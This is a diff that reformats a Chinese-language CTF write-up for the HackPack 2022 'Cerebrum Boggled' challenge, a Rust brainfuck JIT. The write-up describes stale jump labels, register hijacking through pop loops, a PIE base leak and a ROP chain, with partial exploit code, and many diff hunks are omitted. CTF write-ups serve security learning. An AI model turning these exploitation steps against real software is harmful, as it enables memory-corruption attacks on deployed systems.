@@ -1,39 +1,35 @@
 ---
-title: HackPack-2022-cerebrum-boggled-writeup
 date: 2022-04-15 19:43:36
-categories:
- - pwn-writeup
-tags: 
- - HackPackCTF
- - brainfuck
- - jit
- - ROP
+challenge: Cerebrum Boggled
+tags:
+  - brainfuck
+  - jit
 ---
-<!--more-->
 
 ## 题目分析
 
-`rust`程序，提供了源码，实现了一个`brainfuck`的`jit`  
+`rust`程序，提供了源码，实现了一个`brainfuck`的`jit`
 
-与之前见过的`brainfuck`类型题目不同的是，这道题的`generate_jit`函数中没有找到越界等漏洞，程序的主要问题其实在主函数提供的`while result.is_err()`中:  
+与之前见过的`brainfuck`类型题目不同的是，这道题的`generate_jit`函数中没有找到越界等漏洞，程序的主要问题其实在主函数提供的`while result.is_err()`中:
 
- - 重新进行`generate_forward_labels`前后，上次生成的`backward_labels`并没有被清除  
+- 重新进行`generate_forward_labels`前后，上次生成的`backward_labels`并没有被清除
 
-做`pwn`的过程主要就是扩大自己对程序控制范围的过程，因此考虑通过:  
+做`pwn`的过程主要就是扩大自己对程序控制范围的过程，因此考虑通过:
 
- - `nop`填充偏移
- - 先后传入`[`与`]`控制跳转
- - `,`与`.`末尾的大量`pop`语句
+- `nop`填充偏移
+- 先后传入`[`与`]`控制跳转
+- `,`与`.`末尾的大量`pop`语句
 
 三者结合，控制`rcx`寄存器，将其劫持到`&ret_addr`附近，进而控制`ret_addr`进行`rop`.
 
---------
+---
 
 ## 漏洞利用
 
-结合`gdb`进行下列分析和尝试:  
+结合`gdb`进行下列分析和尝试:
 
-首先设置`payload = b"+[><,.__]"`进行测试，将汇编语句与`jit`中提供的功能对应，计算偏移:  
+首先设置`payload = b"+[><,.__]"`进行测试，将汇编语句与`jit`中提供的功能对应，计算偏移:
+
 ```c++
 // starting	0xe
 0x000:      push   rbx
@@ -110,6 +106,7 @@ tags:
 ```
 
 对应的汇编指令长度计算:
+
 ```py
 def calcLen(payload):
 	initSum = 0
@@ -129,13 +126,13 @@ def calcLen(payload):
 	return initSum
 ```
 
---------
+---
 
 ### 控制`rax`, `rcx`寄存器
 
-通过以上分析，就可以构造`pop rax`的循环( 程序会在`]`处进行条件跳转，目标是与之对应的`[`结束的位置，故把`payload`分为两段先后送入程序 ):  
+通过以上分析，就可以构造`pop rax`的循环( 程序会在`]`处进行条件跳转，目标是与之对应的`[`结束的位置，故把`payload`分为两段先后送入程序 ):
 
-__值得注意的是，若`payload1`中`[`所对应的跳转地址比`calcLen(payload1)`大，则`rust`会报错__
+**值得注意的是，若`payload1`中`[`所对应的跳转地址比`calcLen(payload1)`大，则`rust`会报错**
 
 ```
 // payload1:
@@ -148,16 +145,19 @@ __值得注意的是，若`payload1`中`[`所对应的跳转地址比`calcLen(pa
 0x02b 		','
 0x048 		']' -> 0x02a_pop_rax
 ```
+
 即:
+
 ```py
 payload1 = b'_'*0x12 + b'['
 payload2 = b',,]'
 payload1 = payload1.ljust(calcLen(payload2), b'_')
 ```
+
 测试发现成功控制`rax`;
 
-
 在此基础上构造循环`pop rcx; pop rax;`:
+
 ```
 // payload2 = b',,,],]'
 // payload1:
@@ -176,13 +176,13 @@ payload1 = payload1.ljust(calcLen(payload2), b'_')
 0x08c 		']' -> 0x047_pop_rcx_rax
 ```
 
---------
+---
 
 ### 泄露`PIE`偏移
 
-程序实现的`jit`中将`rcx`用于定位写入的地址，一开始的想法是将`rcx`劫持到一块可写可执行的内存区域进行`ret2shellcode`，但是程序中并没有找到合适的空间，同时程序的`plt`表上什么也没有，就只能考虑更麻烦的`ROP`，由于`PIE`的存在，第一步自然是泄露`elf`基址:  
+程序实现的`jit`中将`rcx`用于定位写入的地址，一开始的想法是将`rcx`劫持到一块可写可执行的内存区域进行`ret2shellcode`，但是程序中并没有找到合适的空间，同时程序的`plt`表上什么也没有，就只能考虑更麻烦的`ROP`，由于`PIE`的存在，第一步自然是泄露`elf`基址:
 
-调试发现`rcx`附近有几个特别的地址，它们末尾几位总是`430`，相对于`elf_base`是固定的且`offset=0x10430`，就可以借助`brainfuck`中`.`逐字节泄露:  
+调试发现`rcx`附近有几个特别的地址，它们末尾几位总是`430`，相对于`elf_base`是固定的且`offset=0x10430`，就可以借助`brainfuck`中`.`逐字节泄露:
 
 ```py
 payload2 += b'[>.,],'
@@ -203,9 +203,9 @@ elf_base = leak_addr - 0x10430
 
 这样就可以通过偏移来构造`ROP`了.
 
---------
+---
 
-但是刚刚泄露时循环`>`修改了`rbx`，因此通过`b'[<,],'`将`rbx`归零:   
+但是刚刚泄露时循环`>`修改了`rbx`，因此通过`b'[<,],'`将`rbx`归零:
 
 ```py
 payload2 += b'[<,],'
@@ -216,11 +216,11 @@ for i in range(0x5f):
 sn(b'\x00')
 ```
 
---------
+---
 
 ### ROP
 
-进一步调试，发现程序最后`ret_addr`距离`rcx`还有一段偏移，因此考虑再最初多`pop`几次`rax`:  
+进一步调试，发现程序最后`ret_addr`距离`rcx`还有一段偏移，因此考虑再最初多`pop`几次`rax`:
 
 ```py
 # previous
@@ -228,9 +228,9 @@ for i in range((0x7ffe79705030-0x7ffe79704e90) // 8):
 	sn(b'a')
 ```
 
---------
+---
 
-接下来就是`ROP`利用了:  
+接下来就是`ROP`利用了:
 
 ```py
 def ROP(base):
@@ -263,7 +263,7 @@ def ROP(base):
 	sn(b'\x00'*2)
 ```
 
---------
+---
 
 ## exp.py
 
@@ -398,3 +398,4 @@ ROP(elf_base)
 
 irt()
 ```
+
